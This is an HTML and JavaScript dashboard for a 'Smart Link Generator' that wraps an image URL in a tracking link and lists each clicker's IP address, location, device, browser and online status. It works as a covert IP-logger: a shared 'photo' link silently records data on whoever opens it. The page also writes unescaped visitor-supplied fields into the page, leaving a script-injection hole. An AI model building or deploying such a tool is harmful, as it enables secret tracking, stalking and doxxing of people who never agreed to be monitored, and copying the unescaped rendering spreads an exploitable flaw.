<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>🔗 Smart Link Generator - BBCC Skill Hub</title>
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            background: #0b0e1a;
            color: #ffffff;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            padding: 30px 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 32px;
            font-weight: 800;
            background: linear-gradient(135deg, #ffd700, #f5a623);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .header p {
            color: rgba(255, 255, 255, 0.4);
            margin-top: 5px;
            font-size: 14px;
        }

        .generator-box {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            margin-bottom: 30px;
        }

        .generator-box label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 8px;
        }

        .generator-box .input-group {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }

        .generator-box input[type="text"] {
            flex: 1;
            padding: 14px 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            font-family: 'Inter', sans-serif;
            transition: all 0.3s ease;
            min-width: 200px;
        }

        .generator-box input[type="text"]:focus {
            outline: none;
            border-color: rgba(255, 215, 0, 0.3);
            background: rgba(255, 255, 255, 0.08);
        }

        .generator-box input[type="text"]::placeholder {
            color: rgba(255, 255, 255, 0.2);
        }

        .generator-box .btn-generate {
            padding: 14px 35px;
            background: linear-gradient(135deg, #ffd700, #f5a623);
            border: none;
            border-radius: 12px;
            color: #0b0e1a;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Inter', sans-serif;
            white-space: nowrap;
        }

        .generator-box .btn-generate:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.2);
        }

        .generator-box .btn-generate:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .generated-link-box {
            background: rgba(255, 215, 0, 0.05);
            border-radius: 12px;
            padding: 15px 20px;
            border: 1px solid rgba(255, 215, 0, 0.1);
            margin-top: 15px;
            display: none;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
        }

        .generated-link-box.show {
            display: flex;
        }

        .generated-link-box .link-text {
            color: #ffd700;
            font-size: 14px;
            word-break: break-all;
            flex: 1;
        }

        .generated-link-box .btn-copy {
            padding: 8px 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: #fff;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Inter', sans-serif;
            font-size: 13px;
        }

        .generated-link-box .btn-copy:hover {
            background: rgba(255, 215, 0, 0.1);
            border-color: rgba(255, 215, 0, 0.2);
        }

        .stats-row {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.02);
            border-radius: 16px;
            padding: 20px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.03);
            transition: all 0.3s ease;
        }

        .stat-card:hover {
            border-color: rgba(255, 215, 0, 0.1);
            transform: translateY(-2px);
        }

        .stat-card .stat-number {
            font-size: 32px;
            font-weight: 800;
            color: #ffd700;
        }

        .stat-card .stat-label {
            font-size: 12px;
            color: rgba(255, 255, 255, 0.3);
            margin-top: 5px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        .table-container {
            background: rgba(255, 255, 255, 0.02);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            overflow: hidden;
        }

        .table-header {
            padding: 20px 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            flex-wrap: wrap;
            gap: 10px;
        }

        .table-header h2 {
            font-size: 18px;
            font-weight: 700;
        }

        .table-header h2 span {
            color: #ffd700;
        }

        .table-header .btn-refresh {
            padding: 8px 20px;
            background: rgba(255, 215, 0, 0.05);
            border: 1px solid rgba(255, 215, 0, 0.1);
            border-radius: 8px;
            color: #ffd700;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Inter', sans-serif;
            font-size: 13px;
        }

        .table-header .btn-refresh:hover {
            background: rgba(255, 215, 0, 0.1);
        }

        .table-header .btn-clear {
            padding: 8px 20px;
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.2);
            border-radius: 8px;
            color: #ef4444;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Inter', sans-serif;
            font-size: 13px;
        }

        .table-header .btn-clear:hover {
            background: rgba(239, 68, 68, 0.2);
        }

        .table-wrapper {
            overflow-x: auto;
            padding: 0 5px 5px 5px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }

        thead {
            background: rgba(255, 255, 255, 0.02);
        }

        th {
            padding: 15px 15px;
            text-align: left;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.4);
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
        }

        td {
            padding: 15px 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
            color: rgba(255, 255, 255, 0.8);
            font-size: 13px;
        }

        tr:hover td {
            background: rgba(255, 255, 255, 0.02);
        }

        .status-badge {
            display: inline-block;
            padding: 3px 12px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 600;
        }

        .status-badge.online {
            background: rgba(34, 197, 94, 0.15);
            color: #22c55e;
        }

        .status-badge.offline {
            background: rgba(239, 68, 68, 0.15);
            color: #ef4444;
        }

        .no-data {
            text-align: center;
            padding: 50px 20px;
            color: rgba(255, 255, 255, 0.2);
        }

        .no-data i {
            font-size: 48px;
            display: block;
            margin-bottom: 15px;
            color: rgba(255, 255, 255, 0.05);
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 215, 0, 0.1);
            border-top-color: #ffd700;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .toast {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: rgba(11, 14, 26, 0.95);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 215, 0, 0.15);
            color: #fff;
            padding: 15px 25px;
            border-radius: 12px;
            font-weight: 600;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
            z-index: 99999;
            animation: slideUp 0.5s ease;
            max-width: 400px;
            font-family: 'Inter', sans-serif;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @media (max-width: 768px) {
            .header h1 { font-size: 24px; }
            .generator-box { padding: 20px; }
            .generator-box .input-group { flex-direction: column; }
            .generator-box .btn-generate { width: 100%; justify-content: center; }
            .generated-link-box { flex-direction: column; align-items: stretch; }
            .stats-row { grid-template-columns: 1fr 1fr; }
            th, td { padding: 10px 12px; font-size: 12px; }
            .table-header { flex-direction: column; align-items: stretch; }
            .table-header .btn-refresh,
            .table-header .btn-clear { width: 100%; text-align: center; }
        }

        @media (max-width: 480px) {
            .stats-row { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <h1>🔗 Smart Link Generator</h1>
            <p>Generate tracking links that capture visitor location, IP, and device info</p>
        </div>

        <div class="generator-box">
            <label for="imageUrl">📷 Enter Image/Photo URL</label>
            <div class="input-group">
                <input type="text" id="imageUrl" placeholder="https://example.com/photo.jpg" />
                <button class="btn-generate" id="generateBtn" onclick="generateLink()">
                    <i class="fas fa-link"></i> Generate Tracking Link
                </button>
            </div>

            <div class="generated-link-box" id="generatedLinkBox">
                <span class="link-text" id="generatedLink"></span>
                <button class="btn-copy" onclick="copyLink()">
                    <i class="fas fa-copy"></i> Copy
                </button>
            </div>
        </div>

        <div class="stats-row">
            <div class="stat-card">
                <div class="stat-number" id="totalClicks">0</div>
                <div class="stat-label">Total Clicks</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="uniqueVisitors">0</div>
                <div class="stat-label">Unique Visitors</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="todayClicks">0</div>
                <div class="stat-label">Today's Clicks</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="onlineNow">0</div>
                <div class="stat-label">Online Now</div>
            </div>
        </div>

        <div class="table-container">
            <div class="table-header">
                <h2>📊 <span>Visitor Data</span></h2>
                <div style="display:flex;gap:10px;flex-wrap:wrap;">
                    <button class="btn-refresh" onclick="fetchData()">
                        <i class="fas fa-sync-alt"></i> Refresh
                    </button>
                    <button class="btn-clear" onclick="clearAllData()">
                        <i class="fas fa-trash"></i> Clear All
                    </button>
                </div>
            </div>
            <div class="table-wrapper">
                <table>
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>🕐 Time</th>
                            <th>📍 Location</th>
                            <th>🌐 IP Address</th>
                            <th>📱 Device</th>
                            <th>🖥️ Browser</th>
                            <th>📷 Image</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody id="dataTableBody">
                        <tr>
                            <td colspan="8">
                                <div class="no-data">
                                    <i class="fas fa-spinner fa-spin"></i>
                                    <p>Loading data...</p>
                                </div>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        const API_BASE = window.location.origin + '/api';

        // ============================================
        // GENERATE LINK
        // ============================================
        async function generateLink() {
            const imageUrl = document.getElementById('imageUrl').value.trim();
            const btn = document.getElementById('generateBtn');
            
            if (!imageUrl) {
                showToast('❌ Please enter an image URL');
                return;
            }

            try {
                new URL(imageUrl);
            } catch (e) {
                showToast('❌ Please enter a valid URL');
                return;
            }

            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span> Generating...';

            try {
                const res = await fetch(`${API_BASE}/tracking/generate`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ imageUrl })
                });

                const result = await res.json();

                if (result.success) {
                    const link = result.data.link;
                    document.getElementById('generatedLink').textContent = link;
                    document.getElementById('generatedLinkBox').classList.add('show');
                    showToast('✅ Link generated successfully!');
                    copyToClipboard(link);
                    fetchData();
                } else {
                    showToast('❌ ' + result.message);
                }
            } catch (err) {
                showToast('❌ Server error: ' + err.message);
            }

            btn.disabled = false;
            btn.innerHTML = '<i class="fas fa-link"></i> Generate Tracking Link';
        }

        // ============================================
        // COPY LINK
        // ============================================
        function copyLink() {
            const link = document.getElementById('generatedLink').textContent;
            copyToClipboard(link);
        }

        function copyToClipboard(text) {
            if (navigator.clipboard) {
                navigator.clipboard.writeText(text).then(() => {
                    showToast('✅ Link copied to clipboard!');
                }).catch(() => {
                    fallbackCopy(text);
                });
            } else {
                fallbackCopy(text);
            }
        }

        function fallbackCopy(text) {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            showToast('✅ Link copied to clipboard!');
        }

        // ============================================
        // FETCH DATA FROM SERVER
        // ============================================
        async function fetchData() {
            try {
                const res = await fetch(`${API_BASE}/tracking/data`);
                const result = await res.json();

                if (result.success) {
                    renderData(result.data);
                    updateStats(result.data);
                } else {
                    showToast('❌ Failed to fetch data');
                }
            } catch (err) {
                console.error('Fetch error:', err);
                document.getElementById('dataTableBody').innerHTML = `
                    <tr>
                        <td colspan="8">
                            <div class="no-data">
                                <i class="fas fa-exclamation-triangle"></i>
                                <p>Failed to load data. Please refresh.</p>
                            </div>
                        </td>
                    </tr>
                `;
            }
        }

        // ============================================
        // RENDER TABLE
        // ============================================
        function renderData(data) {
            const tbody = document.getElementById('dataTableBody');

            if (!data || data.length === 0) {
                tbody.innerHTML = `
                    <tr>
                        <td colspan="8">
                            <div class="no-data">
                                <i class="fas fa-inbox"></i>
                                <p>No visitor data yet. Generate a link and share it!</p>
                            </div>
                        </td>
                    </tr>
                `;
                return;
            }

            let html = '';
            let index = 1;
            
            data.forEach(item => {
                // Get latest visit
                const latestVisit = item.visits && item.visits.length > 0 ? item.visits[item.visits.length - 1] : null;
                
                if (!latestVisit) return;

                const time = new Date(latestVisit.visitedAt);
                const formattedTime = time.toLocaleString('en-IN', {
                    day: '2-digit',
                    month: 'short',
                    year: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });

                const isOnline = new Date(latestVisit.visitedAt) > new Date(Date.now() - 5 * 60 * 1000);

                html += `
                    <tr>
                        <td>${index}</td>
                        <td>${formattedTime}</td>
                        <td>${latestVisit.location || 'Unknown'}</td>
                        <td><code style="background:rgba(255,255,255,0.03);padding:2px 8px;border-radius:4px;font-size:12px;">${latestVisit.ip || 'Unknown'}</code></td>
                        <td>
                            <i class="fas ${latestVisit.device === 'Mobile' ? 'fa-mobile-alt' : latestVisit.device === 'Tablet' ? 'fa-tablet-alt' : 'fa-desktop'}"></i>
                            ${latestVisit.device || 'Unknown'}
                        </td>
                        <td>${latestVisit.browser || 'Unknown'} <span style="color:rgba(255,255,255,0.2);font-size:11px;">${latestVisit.os || ''}</span></td>
                        <td>
                            <a href="${item.imageUrl}" target="_blank" style="color:#ffd700;text-decoration:none;font-size:12px;">
                                <i class="fas fa-image"></i> View
                            </a>
                        </td>
                        <td>
                            <span class="status-badge ${isOnline ? 'online' : 'offline'}">
                                ${isOnline ? '🟢 Online' : '⚪ Offline'}
                            </span>
                        </td>
                    </tr>
                `;
                index++;
            });

            tbody.innerHTML = html;
        }

        // ============================================
        // UPDATE STATS
        // ============================================
        function updateStats(data) {
            const total = data.reduce((sum, item) => sum + (item.totalClicks || 0), 0);
            document.getElementById('totalClicks').textContent = total;

            const unique = data.reduce((sum, item) => sum + (item.uniqueVisitors || 0), 0);
            document.getElementById('uniqueVisitors').textContent = unique;

            const today = new Date().toDateString();
            let todayClicks = 0;
            let onlineNow = 0;
            const fiveMinAgo = new Date(Date.now() - 5 * 60 * 1000);

            data.forEach(item => {
                if (item.visits) {
                    item.visits.forEach(visit => {
                        const date = new Date(visit.visitedAt);
                        if (date.toDateString() === today) {
                            todayClicks++;
                        }
                        if (date > fiveMinAgo) {
                            onlineNow++;
                        }
                    });
                }
            });

            document.getElementById('todayClicks').textContent = todayClicks;
            document.getElementById('onlineNow').textContent = onlineNow;
        }

        // ============================================
        // CLEAR ALL DATA
        // ============================================
        async function clearAllData() {
            if (!confirm('⚠️ Are you sure you want to clear ALL tracking data?')) return;

            try {
                const res = await fetch(`${API_BASE}/tracking/clear`, {
                    method: 'DELETE'
                });
                const result = await res.json();

                if (result.success) {
                    showToast('🗑️ All data cleared!');
                    fetchData();
                } else {
                    showToast('❌ Failed to clear data');
                }
            } catch (err) {
                showToast('❌ Server error: ' + err.message);
            }
        }

        // ============================================
        // TOAST NOTIFICATION
        // ============================================
        function showToast(message) {
            const existing = document.querySelector('.toast');
            if (existing) existing.remove();

            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.textContent = message;
            document.body.appendChild(toast);

            setTimeout(() => {
                toast.style.opacity = '0';
                toast.style.transition = 'opacity 0.5s ease';
                setTimeout(() => toast.remove(), 500);
            }, 3000);
        }

        // ============================================
        // INIT
        // ============================================
        document.addEventListener('DOMContentLoaded', function() {
            fetchData();

            document.getElementById('imageUrl').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    generateLink();
                }
            });

            // Auto refresh every 30 seconds
            setInterval(fetchData, 30000);
        });
    </script>

</body>
</html>
